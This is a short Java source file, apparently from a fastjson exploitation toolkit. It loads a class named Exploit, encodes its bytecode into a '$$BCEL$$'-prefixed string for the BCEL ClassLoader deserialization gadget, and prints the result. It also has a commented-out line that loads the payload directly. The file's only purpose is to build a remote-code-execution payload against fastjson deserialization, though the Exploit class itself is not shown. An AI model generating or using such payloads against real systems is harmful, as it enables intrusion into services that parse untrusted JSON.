package com.firebasky.bcelforfastjson;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

public class test {
    public static void main(String[] args) throws Exception {
        Class.forName("com.firebasky.bcelforfastjson.Exploit");
        JavaClass cls = Repository.lookupClass(Exploit.class);//Repository 用于将一个Java Class先转换成原生字节码，
        String code = Utility.encode(cls.getBytes(), true);
        code = "$$BCEL$$" + code;
//        new ClassLoader().loadClass(code).newInstance();
        System.out.println(code);
    }
}
